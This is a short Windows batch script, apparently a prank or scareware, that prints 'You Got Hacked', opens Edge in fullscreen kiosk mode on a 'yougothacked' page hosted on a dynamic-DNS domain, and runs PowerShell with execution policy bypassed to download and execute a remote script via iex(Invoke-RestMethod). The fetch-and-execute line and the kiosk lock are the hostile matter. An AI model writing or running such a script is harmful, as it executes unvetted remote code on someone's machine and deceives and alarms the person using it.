@echo off
echo You Got Hacked
"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --kiosk https://files.bestcoder1877.ddnsfree.com/yougothacked.html --edge-kiosk-type=fullscreen
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex (Invoke-RestMethod 'https://raw.githubusercontent.com/avdaredevil/matrix/master/Matrix.ps1')"
pause